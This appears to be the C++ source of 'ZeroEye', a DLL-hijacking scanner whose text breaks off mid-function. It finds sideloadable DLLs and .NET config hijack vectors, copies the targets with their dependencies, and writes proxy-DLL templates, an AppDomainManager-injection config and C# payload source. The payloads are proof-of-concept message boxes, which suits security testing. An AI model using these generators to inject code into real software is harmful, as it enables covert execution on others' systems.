#pragma once
#include <iostream>
#include <windows.h>
#include <vector>
#include <io.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <algorithm>
#include <unordered_set>
#include <thread>
#include "Sign.hpp"
#include "IM_EX_Ports.hpp"
#include "Language.hpp"
#include "ProxyGenerator.hpp"
#include "DotNetAnalyzer.hpp"

// Scan type flags (bitmask)
enum ScanType {
    SCAN_GUI    = 1 << 0,   // Native GUI exe
    SCAN_CMD    = 1 << 1,   // Native console exe
    SCAN_DOTNET = 1 << 2,   // .NET exe
    SCAN_SYS    = 1 << 3,   // Kernel drivers
    SCAN_EXE    = SCAN_GUI | SCAN_CMD,          // All native exe
    SCAN_ALL    = SCAN_GUI | SCAN_CMD | SCAN_DOTNET | SCAN_SYS,  // Everything
};

bool DeleteDirectory(const std::string& path) {
    SHFILEOPSTRUCTA fileOp = { 0 };
    fileOp.wFunc = FO_DELETE;
    fileOp.pFrom = path.c_str();
    fileOp.fFlags = FOF_NO_UI | FOF_SILENT | FOF_NOCONFIRMATION;
    return SHFileOperationA(&fileOp) == 0;
}

std::vector<std::string> SplitString(const std::string& str, const std::string& delimiter) {
    std::vector<std::string> tokens;
    size_t start = 0, end = 0;
    while ((end = str.find(delimiter, start)) != std::string::npos) {
        tokens.push_back(str.substr(start, end - start));
        start = end + delimiter.length();
    }
    tokens.push_back(str.substr(start));
    return tokens;
}

// ============================================================
// Write export info to file (for infos/ directory in scan mode)
// ============================================================
void WriteExportInfo(const std::string& dllFile, const std::string& txtFile) {
    auto exports = ListExportedFunctions(dllFile, true);
    std::ofstream out(txtFile);
    for (const auto& e : exports) {
        out << e.decoratedName << "\t" << e.undecoratedName << std::endl;
    }
    out.close();
}

// ============================================================
// -d command: Generate 3 proxy DLL templates at once
//   1. <name>_exports.cpp    — extern "C" dllexport stubs (original ZeroEye format)
//   2. <name>_pragma.cpp     — pragma forwarding (Method 1, simplest)
//   3. <name>_class.cpp      — C++ class reconstruction + pragma fallback (Method 3)
// ============================================================
void GenerateAllTemplates(const std::string& dllFile) {
    std::filesystem::path dllPath(dllFile);
    std::string stem = dllPath.stem().string();
    std::string dllName = stem;
    if (dllName.size() > 5 && dllName.substr(dllName.size() - 5) == "_orig")
        dllName = dllName.substr(0, dllName.size() - 5);
    std::string origName = dllName + "_orig";

    std::string exportsFile = dllName + "_exports.cpp";
    std::string pragmaFile  = dllName + "_pragma.cpp";
    std::string classFile   = dllName + "_class.cpp";

    // Read exports, filter out DllMain (we define our own entry point)
    auto exports = ListExportedFunctions(dllFile, true);
    exports.erase(std::remove_if(exports.begin(), exports.end(),
        [](const ExportedFunction& e) {
            return e.undecoratedName == "DllMain" || e.decoratedName == "DllMain";
        }), exports.end());
    if (exports.empty()) {
        SetConsoleColor(FOREGROUND_RED);
        std::cerr << "[-] No exports found in " << dllFile << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return;
    }
    std::cout << "[*] " << exports.size() << " exports found" << std::endl;

    // ========== Template 1: extern "C" dllexport stubs (original format) ==========
    {
        // COM standard exports that need correct signatures
        static const std::map<std::string, std::string> comExports = {
            {"DllCanUnloadNow",
             "//extern \"C\" __declspec(dllexport) HRESULT __stdcall DllCanUnloadNow(void) { return S_FALSE; }"},
            {"DllGetClassObject",
             "//extern \"C\" __declspec(dllexport) HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) { if (ppv) *ppv = nullptr; return CLASS_E_CLASSNOTAVAILABLE; }"},
            {"DllRegisterServer",
             "extern \"C\" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) { return S_OK; }"},
            {"DllUnregisterServer",
             "extern \"C\" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer(void) { return S_OK; }"},
            {"DllInstall",
             "extern \"C\" __declspec(dllexport) HRESULT __stdcall DllInstall(BOOL bInstall, LPCWSTR pszCmdLine) { return S_OK; }"},
            {"ServiceMain",
             "extern \"C\" __declspec(dllexport) void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) { }"},
        };

        std::ofstream out(exportsFile);

        out << "#include <windows.h>\n";
        for (const auto& e : exports) {
            auto it = comExports.find(e.undecoratedName);
            if (it != comExports.end()) {
                out << it->second << "\n";
            } else {
                out << "extern \"C\" __declspec(dllexport) int " << e.undecoratedName
                    << "() { MessageBoxA(0, __FUNCTION__, 0, 0); return 0; }\n";
            }
        }
        out << "\nvoid Payload() {\n";
        out << "    MessageBoxA(NULL, \"DLL Proxy Loaded (Method 1)\", \"ZeroEye\", MB_OK);\n}\n\n";
        out << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n";
        out << "    switch (ul_reason_for_call) {\n";
        out << "    case DLL_PROCESS_ATTACH: DisableThreadLibraryCalls(hModule); Payload(); break;\n";
        out << "    case DLL_PROCESS_DETACH: break;\n    }\n    return TRUE;\n}\n";
        out.close();
    }
    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "[+] " << exportsFile << "  (extern C stubs)" << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    // ========== Template 2: Pragma forwarding ==========
    {
        std::ofstream cpp(pragmaFile);
        cpp << "#include <windows.h>\n";
        for (const auto& e : exports)
            cpp << "#pragma comment(linker, \"/export:" << e.decoratedName
                << "=" << origName << "." << e.decoratedName << "\")\n";
        cpp << "\nvoid Payload() {\n    MessageBoxA(NULL, \"DLL Proxy Loaded (Method 2)\", \"ZeroEye\", MB_OK);\n}\n\n";
        cpp << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n";
        cpp << "    switch (ul_reason_for_call) {\n";
        cpp << "    case DLL_PROCESS_ATTACH: DisableThreadLibraryCalls(hModule); Payload(); break;\n";
        cpp << "    case DLL_PROCESS_DETACH: break;\n    }\n    return TRUE;\n}\n";
        cpp.close();
    }

    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "[+] " << pragmaFile << "  (pragma forwarding)" << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    // ========== Template 3: C++ class reconstruction + pragma safety net ==========
    std::cout << "[*] Generating C++ class reconstruction..." << std::endl;
    auto stats = ProxyGen::generate(exports, classFile, origName);
    ProxyGen::postprocess(classFile);
    std::cout << "      C++ classes: " << stats.explicit_
              << " | Pragma fixup: " << stats.pragmaNeeded.size()
              << " | Unparseable: " << stats.unparseable << std::endl;

    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "[+] " << classFile << "  (C++ class + precise pragma)" << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

}

// Search for a DLL starting from baseDir, then walking up parent directories
// Returns the full path if found, or empty path if not found
// maxDepth: how many parent levels to search (default 3)
std::filesystem::path FindDllInTree(const std::string& dllName,
                                     const std::filesystem::path& baseDir,
                                     int maxDepth = 3) {
    // 1. Check baseDir itself
    auto candidate = baseDir / dllName;
    if (std::filesystem::exists(candidate)) return candidate;

    // 2. Walk up parent directories
    auto current = baseDir;
    for (int i = 0; i < maxDepth; i++) {
        auto parent = current.parent_path();
        if (parent == current) break; // reached root

        // Check parent directory
        candidate = parent / dllName;
        if (std::filesystem::exists(candidate)) return candidate;

        // Check immediate subdirectories of parent (sibling dirs of current)
        try {
            for (auto& entry : std::filesystem::directory_iterator(parent)) {
                if (entry.is_directory() && entry.path() != current) {
                    candidate = entry.path() / dllName;
                    if (std::filesystem::exists(candidate)) return candidate;
                }
            }
        } catch (...) {}

        current = parent;
    }
    return {};
}

void RenameDirectory(const std::filesystem::path& targetDir, const std::string& newDirName) {
    std::filesystem::path newDirPath = targetDir.parent_path() / newDirName;
    try {
        if (std::filesystem::exists(targetDir)) {
            std::filesystem::rename(targetDir, newDirPath);
        }
    }
    catch (const std::filesystem::filesystem_error&) { }
}

// Calculate total size of a directory in bytes
uintmax_t GetDirectorySize(const std::filesystem::path& dir) {
    uintmax_t total = 0;
    try {
        for (auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
            if (entry.is_regular_file()) total += entry.file_size();
        }
    } catch (...) {}
    return total;
}

// Format bytes to human-readable string: "18.3MB", "956KB", "1.2GB"
std::string FormatSize(uintmax_t bytes) {
    char buf[32];
    if (bytes >= 1073741824ULL)
        snprintf(buf, sizeof(buf), "%.1fGB", bytes / 1073741824.0);
    else if (bytes >= 1048576ULL)
        snprintf(buf, sizeof(buf), "%.1fMB", bytes / 1048576.0);
    else if (bytes >= 1024ULL)
        snprintf(buf, sizeof(buf), "%.0fKB", bytes / 1024.0);
    else
        snprintf(buf, sizeof(buf), "%lluB", (unsigned long long)bytes);
    return buf;
}

bool Is_SystemDLL(const char* dllName) {
    HMODULE hModule = LoadLibraryExA(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hModule) {
        FreeLibrary(hModule);
        return true;
    }
    char searchPath[MAX_PATH];
    DWORD SearchID = SearchPathA(NULL, dllName, ".dll", MAX_PATH, searchPath, NULL);
    return SearchID > 0;
}

// ============================================================
// View imported DLLs — uses PEFile RAII, fixed bool reuse
// ============================================================
void ViewImportedDLLs(const char* filePath, std::vector<std::string>& DllList,
                      bool& is64Bit, int is64, bool& isConsoleApp) {
    PEFile pe(filePath);
    if (!pe.isValid()) return;

    is64Bit = pe.is64Bit();

    // FIX: operator precedence — add explicit parentheses
    if ((is64Bit && is64 == 2) || (!is64Bit && is64 == 1)) {
        return;
    }

    isConsoleApp = (pe.getSubsystem() == IMAGE_SUBSYSTEM_WINDOWS_CUI);

    DllList = pe.readImportDlls();
}

// ============================================================
// Filter P/Invoke targets: remove system DLLs
// Called after DotNet::Analyze() since Is_SystemDLL needs LoadLibrary
// ============================================================
void FilterPInvokeTargets(DotNet::HijackResult& result) {
    std::vector<std::string> filtered;
    for (const auto& dll : result.pinvokeTargets) {
        std::string checkName = dll;
        std::string lower = checkName;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        if (lower.size() < 4 || lower.substr(lower.size() - 4) != ".dll") {
            checkName += ".dll";
        }
        if (!Is_SystemDLL(checkName.c_str())) {
            filtered.push_back(dll);
        }
    }
    result.pinvokeTargets = filtered;
}

// ============================================================
// Generate hijack config + payload source into infos/ subdirectory
// Uses AppDomainManager injection — works even with strong-signed assemblies
// ============================================================
void GenerateHijackConfig(const std::filesystem::path& outputDir,
                          const std::string& exeName,
                          const DotNet::HijackResult& dotnet,
                          const std::string& payloadDll = "zeroeye_payload.dll") {
    std::string exeStem = std::filesystem::path(exeName).stem().string();
    std::string configName = exeStem + ".config";
    std::string payloadStem = std::filesystem::path(payloadDll).stem().string();

    // Create infos/ subdirectory
    std::filesystem::path infosDir = outputDir / "infos";
    std::filesystem::create_directories(infosDir);

    std::ofstream cfg(infosDir / configName);

    cfg << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n";
    cfg << "<!--\n";
    cfg << "  ZeroEye .NET Config Hijack Template\n";
    cfg << "  Target: " << exeName << "\n";
    cfg << "  Payload: " << payloadDll << "\n";
    cfg << "\n";
    cfg << "  Usage:\n";
    cfg << "    1. Copy all files from the target directory to a test folder\n";
    cfg << "    2. Rename this file to: " << exeName << ".config\n";
    cfg << "    3. Replace the original .config (or create new if none exists)\n";
    cfg << "    4. Place " << payloadDll << " in the same directory\n";
    cfg << "    5. Run " << exeName << "\n";
    cfg << "\n";
    cfg << "  Build payload:\n";
    cfg << "    csc /target:library /out:" << payloadDll << " /reference:System.Windows.Forms.dll payload.cs\n";
    cfg << "-->\n";
    cfg << "<configuration>\n";

    // Keep original startup element if it was .NET Framework
    if (!dotnet.isNetCore) {
        cfg << "  <startup>\n";
        cfg << "    <supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.7.2\" />\n";
        cfg << "  </startup>\n";
    }

    cfg << "  <runtime>\n";
    cfg << "\n";
    cfg << "    <!-- AppDomainManager Injection (recommended) -->\n";
    cfg << "    <!-- CLR loads our DLL and calls InitializeNewDomain BEFORE app code -->\n";
    cfg << "    <!-- Works regardless of strong name signing on other assemblies -->\n";
    cfg << "    <appDomainManagerAssembly value=\"" << payloadStem
        << ", Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\" />\n";
    cfg << "    <appDomainManagerType value=\"ZeroEye.HijackManager\" />\n";
    cfg << "\n";

    // Read original .exe.config and preserve assemblyBinding content
    // This is critical — without original bindingRedirects the app will crash
    std::filesystem::path originalConfig = std::filesystem::path(dotnet.exePath + ".config");
    bool copiedBindings = false;
    if (std::filesystem::exists(originalConfig)) {
        std::ifstream origFile(originalConfig);
        std::string origContent((std::istreambuf_iterator<char>(origFile)),
                                 std::istreambuf_iterator<char>());
        origFile.close();

        // Extract all <assemblyBinding ...>...</assemblyBinding> blocks
        cfg << "    <!-- Original assemblyBinding from " << originalConfig.filename().string() << " -->\n";
        size_t searchPos = 0;
        while (true) {
            size_t bindStart = origContent.find("<assemblyBinding", searchPos);
            if (bindStart == std::string::npos) break;
            size_t bindEnd = origContent.find("</assemblyBinding>", bindStart);
            if (bindEnd == std::string::npos) break;
            bindEnd += strlen("</assemblyBinding>");

            std::string block = origContent.substr(bindStart, bindEnd - bindStart);
            cfg << "    " << block << "\n";
            copiedBindings = true;
            searchPos = bindEnd;
        }
    }

    if (!copiedBindings && !dotnet.allAssemblyRefs.empty()) {
        cfg << "    <assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n";
        cfg << "      <!-- No original config found. Add bindingRedirects if app crashes. -->\n";
        for (const auto& asmName : dotnet.assemblyRefs) {
            cfg << "      <!-- sideloadable: " << asmName << " -->\n";
        }
        cfg << "    </assemblyBinding>\n";
    }

    cfg << "\n";
    cfg << "  </runtime>\n";
    cfg << "</configuration>\n";

    cfg.close();

    // Generate payload C# source file
    std::string csName = exeStem + "_payload.cs";
    std::ofstream cs(infosDir / csName);

    cs << "using System;\n";
    cs << "using System.Windows.Forms;\n";
    cs << "\n";
    cs << "// ZeroEye AppDomainManager Payload\n";
    cs << "// Target: " << exeName << "\n";
    cs << "// Build:  csc /target:library /out:" << payloadDll << " /reference:System.Windows.Forms.dll " << csName << "\n";
    cs << "\n";
    cs << "namespace ZeroEye\n";
    cs << "{\n";
    cs << "    public class HijackManager : AppDomainManager\n";
    cs << "    {\n";
    cs << "        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)\n";
    cs << "        {\n";
    cs << "            try\n";
    cs << "            {\n";
    cs << "                MessageBox.Show(\n";
    cs << "                    \"ZeroEye Config Hijack PoC SUCCESS!\\n\\n\" +\n";
    cs << "                    \"AppDomainManager injection worked.\\n\" +\n";
    cs << "                    \"Process: \" + System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,\n";
    cs << "                    \"ZeroEye - Hijack Verified\",\n";
    cs << "                    MessageBoxButtons.OK,\n";
    cs << "                    MessageBoxIcon.Warning\n";
    cs << "                );\n";
    cs << "            }\n";
    cs << "            catch\n";
    cs << "            {\n";
    cs << "                System.IO.File.WriteAllText(\n";
    cs << "                    System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \"zeroeye_hijack_proof.txt\"),\n";
    cs << "                    \"ZeroEye hijack executed at: \" + DateTime.Now.ToString()\n";
    cs << "                );\n";
    cs << "            }\n";
    cs << "            base.InitializeNewDomain(appDomainInfo);\n";
    cs << "        }\n";
    cs << "    }\n";
    cs << "}\n";

    cs.close();

    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "    [+] Generated: " << configName << std::endl;
    std::cout << "    [+] Generated: " << csName << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

// ============================================================
// .NET exe output: scan mode — copy exe + write Info.txt
// Output folder: Eyebin/Dll/{arch}/{name}[{type}-{count}-{size}]
// ============================================================
void DotNet_File_Output(const std::string& filePath, bool is64Bit, int is64,
                        const DotNet::HijackResult& dotnet) {
    if (!DotNet::HasExploitableVectors(dotnet)) {
        std::cout << filePath << std::endl;
        return;
    }

    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "[+] " << filePath
              << (dotnet.isNetCore ? "  [dotnet core]" : "  [dotnet]") << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    // Print details to console
    if (dotnet.configCanCreate) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN); // yellow
        std::cout << "    [+] Config: can be created (.exe.config)" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    } else if (dotnet.configExists) {
        std::cout << "    [*] Config: exists (.exe.config)" << std::endl;
    }
    if (dotnet.depsJsonExists) {
        std::cout << "    [*] deps.json: exists" << std::endl;
    }
    for (const auto& dll : dotnet.pinvokeTargets) {
        SetConsoleColor(FOREGROUND_GREEN);
        std::cout << "    [+] P/Invoke: " << dll << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }
    for (const auto& asm_ : dotnet.assemblyRefs) {
        std::cout << "    [*] Assembly: " << asm_ << std::endl;
    }

    // Create output directory
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::filesystem::path currentDir = std::filesystem::path(currentPath).parent_path();

    std::filesystem::path path(filePath);
    std::string exeStem = path.stem().string();
    std::string tempDir = "_tmp_" + exeStem;
    std::filesystem::path targetDir;

    if (is64Bit) {
        targetDir = currentDir / "Eyebin" / "Dll" / "x64" / tempDir;
    } else {
        targetDir = currentDir / "Eyebin" / "Dll" / "x86" / tempDir;
    }

    if (std::filesystem::exists(targetDir))
        std::filesystem::remove_all(targetDir);
    std::filesystem::create_directories(targetDir);

    // Copy only relevant files: target exe, its config, deps, and dependency DLLs
    std::string ExeName = path.filename().string();
    std::filesystem::path sourceDir = path.parent_path();

    auto tryCopy = [&](const std::filesystem::path& src) {
        if (std::filesystem::exists(src)) {
            try {
                std::filesystem::copy_file(src, targetDir / src.filename(),
                                           std::filesystem::copy_options::overwrite_existing);
            } catch (...) {}
        }
    };

    // 1. Target exe
    tryCopy(path);
    if (!std::filesystem::exists(targetDir / ExeName)) return;

    // 2. Config files
    tryCopy(std::filesystem::path(filePath + ".config"));
    tryCopy(sourceDir / (exeStem + ".deps.json"));
    tryCopy(sourceDir / (exeStem + ".runtimeconfig.json"));
    tryCopy(sourceDir / (exeStem + ".runtimeconfig.dev.json"));

    // 3. Only copy DLLs actually referenced in .NET metadata
    for (const auto& asmName : dotnet.allAssemblyRefs) {
        tryCopy(sourceDir / (asmName + ".dll"));
    }
    // Also copy P/Invoke native DLL targets
    for (const auto& dllName : dotnet.pinvokeTargets) {
        tryCopy(sourceDir / dllName);
        // Try with .dll extension if not present
        std::string lower = dllName;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        if (lower.size() < 4 || lower.substr(lower.size() - 4) != ".dll") {
            tryCopy(sourceDir / (dllName + ".dll"));
        }
    }

    // Generate hijack config + payload into infos/
    GenerateHijackConfig(targetDir, ExeName, dotnet);

    // Write Info.txt into infos/
    std::filesystem::path infosDir = targetDir / "infos";
    std::filesystem::create_directories(infosDir);
    std::ofstream info(infosDir / "Info.txt");
    info << filePath << std::endl;
    info << "Type: " << (dotnet.isNetCore ? ".NET Core/5+" : ".NET Framework") << std::endl;
    info << "Arch: " << (is64Bit ? "x64" : "x86") << std::endl;

    if (dotnet.configCanCreate)
        info << "[+] Config hijack: .exe.config can be created" << std::endl;
    else if (dotnet.configExists)
        info << "[*] Config: .exe.config exists" << std::endl;
    if (dotnet.depsJsonExists)
        info << "[*] deps.json exists" << std::endl;
    if (dotnet.runtimeConfigExists)
        info << "[*] runtimeconfig.json exists" << std::endl;

    int hijackCount = 0;
    if (!dotnet.pinvokeTargets.empty()) {
        info << "\nP/Invoke native DLLs:" << std::endl;
        for (const auto& dll : dotnet.pinvokeTargets) {
            info << "  [+] " << dll << std::endl;
            hijackCount++;
        }
    }
    if (!dotnet.assemblyRefs.empty()) {
        info << "\nSideloadable assemblies:" << std::endl;
        for (const auto& asm_ : dotnet.assemblyRefs) {
            info << "  [*] " << asm_ << std::endl;
            hijackCount++;
        }
    }
    if (!dotnet.allAssemblyRefs.empty()) {
        info << "\nAll assembly references:" << std::endl;
        for (const auto& asm_ : dotnet.allAssemblyRefs) {
            info << "  " << asm_ << std::endl;
        }
    }
    info.close();

    // Backup original config, then replace with hijack config
    std::filesystem::path origConfig = targetDir / (ExeName + ".config");
    std::filesystem::path backupConfig = targetDir / (ExeName + ".config.bak");
    std::filesystem::path hijackConfig = infosDir / (exeStem + ".config");
    if (std::filesystem::exists(origConfig)) {
        try { std::filesystem::rename(origConfig, backupConfig); } catch (...) {}
    }
    if (std::filesystem::exists(hijackConfig)) {
        try { std::filesystem::copy_file(hijackConfig, origConfig,
                    std::filesystem::copy_options::overwrite_existing); } catch (...) {}
    }

    // Rename to final name: exeStem[type-count-size]
    if (hijackCount == 0) hijackCount = 1; // at least config hijack
    uintmax_t dirSize = GetDirectorySize(targetDir);
    std::string dotnetType = dotnet.isNetCore ? "dotnet-core" : "dotnet";
    std::string finalName = exeStem + "[" + dotnetType + "-"
                          + std::to_string(hijackCount) + "-" + FormatSize(dirSize) + "]";

    std::filesystem::path parentDir = targetDir.parent_path();
    std::filesystem::path finalPath = parentDir / finalName;
    if (std::filesystem::exists(finalPath)) {
        for (int dup = 2; dup <= 99; dup++) {
            finalPath = parentDir / (finalName + "(" + std::to_string(dup) + ")");
            if (!std::filesystem::exists(finalPath)) break;
        }
    }
    RenameDirectory(targetDir, finalPath.filename().string());
}

// ============================================================
// .NET single-file analysis output (for -i and -d auto-detect)
// ============================================================
void DotNet_Print_Analysis(const DotNet::HijackResult& r) {
    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "\n[*] " << r.exePath << std::endl;
    std::cout << "    Type: " << (r.isNetCore ? ".NET Core/5+" : ".NET Framework")
              << " | " << (r.is64Bit ? "x64" : "x86") << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    std::cout << "\n--- Hijack Vectors ---" << std::endl;

    if (r.configCanCreate) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN); // yellow
        std::cout << "[+] Config hijack: .exe.config can be CREATED (high risk)" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    } else if (r.configExists) {
        SetConsoleColor(FOREGROUND_GREEN);
        std::cout << "[+] Config hijack: .exe.config exists (can be modified)" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    if (r.depsJsonExists) {
        SetConsoleColor(FOREGROUND_GREEN);
        std::cout << "[+] deps.json hijack: deps.json exists (can be modified)" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    if (!r.pinvokeTargets.empty()) {
        std::cout << "\n--- P/Invoke Native DLLs ---" << std::endl;
        for (const auto& dll : r.pinvokeTargets) {
            SetConsoleColor(FOREGROUND_GREEN);
            std::cout << "[+] " << dll << std::endl;
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }
    }

    if (!r.assemblyRefs.empty()) {
        std::cout << "\n--- Sideloadable Assemblies ---" << std::endl;
        for (const auto& asm_ : r.assemblyRefs) {
            SetConsoleColor(FOREGROUND_GREEN);
            std::cout << "[+] " << asm_ << std::endl;
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }
    }

    if (!r.allAssemblyRefs.empty()) {
        std::cout << "\n--- All Assembly References ---" << std::endl;
        for (const auto& asm_ : r.allAssemblyRefs) {
            bool isSys = DotNet::IsSystemAssembly(asm_);
            if (!isSys) SetConsoleColor(FOREGROUND_GREEN);
            std::cout << (isSys ? "    " : "[+] ") << asm_ << std::endl;
            if (!isSys) SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }
    }

    if (!DotNet::HasExploitableVectors(r)) {
        std::cout << "\n[-] No obvious hijack vectors found." << std::endl;
    }
}

void Exe_Output(std::filesystem::path filename, std::vector<std::string>& DllList) {
    LanguageStrings lang = LanguageManager::GetStrings();

    if (DllList.size()) {
        if (std::filesystem::exists(filename)) {
            std::cout << lang.importedDlls << std::endl;
            for (const auto& dll : DllList) {
                if (Is_SystemDLL(dll.c_str())) {
                    std::cout << dll << std::endl;
                } else {
                    SetConsoleColor(FOREGROUND_GREEN);
                    std::cout << "[+] " << dll << std::endl;
                    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
                }
            }
        } else {
            std::cout << lang.errorFile << std::endl;
        }
    } else {
        std::cout << lang.noImportsFound << std::endl;
    }
}

// Recursively copy non-system DLL dependencies up to maxDepth levels
// sourceDir: original exe/dll directory (for finding DLLs)
// targetDir: Eyebin output directory (for copying to)
// dllName: the DLL to resolve
// depth: current recursion depth (starts at 1)
// maxDepth: stop recursing at this level
// is64: architecture filter
// logFile: Info.txt stream for recording paths
// visited: already-processed DLLs (avoid infinite loops)
// indent: indentation string for log formatting
void CopyDllChain(const std::filesystem::path& sourceDir,
                   const std::filesystem::path& targetDir,
                   const std::string& dllName,
                   int depth, int maxDepth, int is64,
                   std::ofstream& logFile,
                   std::unordered_set<std::string>& visited,
                   const std::string& indent = "") {
    // Skip system DLLs and already-visited
    std::string dllLower = dllName;
    std::transform(dllLower.begin(), dllLower.end(), dllLower.begin(), ::tolower);
    if (Is_SystemDLL(dllName.c_str()) || visited.count(dllLower)) return;
    visited.insert(dllLower);

    // Find the DLL source
    std::filesystem::path sourcePath = sourceDir / dllName;
    if (!std::filesystem::exists(sourcePath)) {
        auto found = FindDllInTree(dllName, sourceDir);
        if (!found.empty()) sourcePath = found;
    }
    if (!std::filesystem::exists(sourcePath)) return;

    // Copy to target
    std::filesystem::path targetPath = targetDir / dllName;
    try {
        std::filesystem::copy_file(sourcePath, targetPath, std::filesystem::copy_options::overwrite_existing);
    } catch (...) { return; }

    // Log with original full path
    logFile << indent << "[+] " << dllName << "  (" << sourcePath.string() << ")" << std::endl;

    // Stop if max depth reached
    if (depth >= maxDepth) return;

    // Read this DLL's imports and recurse
    bool dllIs64Bit, dllIsConsole;
    std::vector<std::string> subDlls;
    ViewImportedDLLs(targetPath.string().c_str(), subDlls, dllIs64Bit, is64, dllIsConsole);

    // Use the DLL's ORIGINAL source directory as search base for its dependencies
    std::filesystem::path dllSourceDir = sourcePath.parent_path();

    bool hasNested = false;
    for (const auto& sub : subDlls) {
        if (!Is_SystemDLL(sub.c_str())) {
            std::string subLower = sub;
            std::transform(subLower.begin(), subLower.end(), subLower.begin(), ::tolower);
            if (!visited.count(subLower)) {
                hasNested = true;
                CopyDllChain(dllSourceDir, targetDir, sub,
                             depth + 1, maxDepth, is64,
                             logFile, visited, indent + "    ");
            }
        }
    }
    if (hasNested) {
        logFile << indent << "    [*] " << dllName << " nested dependencies resolved (depth " << depth << "/" << maxDepth << ")" << std::endl;
    }
}

void File_Output(std::string filePath, std::vector<std::string>& DllList,
                 bool is64Bit, int is64, std::vector<std::string> result, bool isConsoleApp = false) {
    if (DllList.size()) {
        int iNum = 0;
        bool flag = false;
        for (const auto& dll : DllList) {
            for (const auto& part : result) {
                if (dll.find(part) != std::string::npos) {
                    flag = true;
                    break;
                }
            }
            if (flag) break;
            if (!Is_SystemDLL(dll.c_str())) {
                iNum += 1;
            }
        }
        if (!iNum || flag) {
            std::cout << filePath << std::endl;
            return;
        } else {
            SetConsoleColor(FOREGROUND_GREEN);
            std::cout << "[+] " << filePath << std::endl;
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }

        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        std::filesystem::path currentDir = std::filesystem::path(currentPath).parent_path();
        std::filesystem::path targetDir;

        std::filesystem::path path(filePath);
        std::string exeStem = path.stem().string();

        // Use a temp name first, rename after we know total DLL count + size
        std::string tempDir = "_tmp_" + exeStem;
        if (is64Bit) {
            targetDir = currentDir / "Eyebin" / "Dll" / "x64" / tempDir;
        } else {
            targetDir = currentDir / "Eyebin" / "Dll" / "x86" / tempDir;
        }

        if (std::filesystem::exists(targetDir))
            std::filesystem::remove_all(targetDir);
        std::filesystem::create_directories(targetDir);

        std::string ExeName = path.filename().string();
        std::filesystem::copy_file(filePath, targetDir / ExeName, std::filesystem::copy_options::overwrite_existing);
        std::filesystem::path infosDir = targetDir / "infos";
        std::filesystem::create_directories(infosDir);
        std::ofstream dllNamesFile(infosDir / "Info.txt");
        dllNamesFile << filePath << std::endl;
        std::filesystem::path sourceDir = std::filesystem::path(filePath).parent_path();
        std::unordered_set<std::string> visited;

        for (const auto& dll : DllList) {
            if (Is_SystemDLL(dll.c_str())) {
                dllNamesFile << dll << std::endl;
            } else {
                CopyDllChain(sourceDir, targetDir, dll,
                             1, 4, is64,
                             dllNamesFile, visited, "");
            }
        }
        dllNamesFile.close();

        // Build final directory name: exeStem[type-count-size]
        int totalDlls = (int)visited.size();
        uintmax_t dirSize = GetDirectorySize(targetDir);
        std::string exeType = isConsoleApp ? "cmd" : "gui";
        std::string finalName = exeStem + "[" + exeType + "-"
                              + std::to_string(totalDlls) + "-" + FormatSize(dirSize) + "]";

        // Handle duplicates: append (2), (3), etc.
        std::filesystem::path parentDir = targetDir.parent_path();
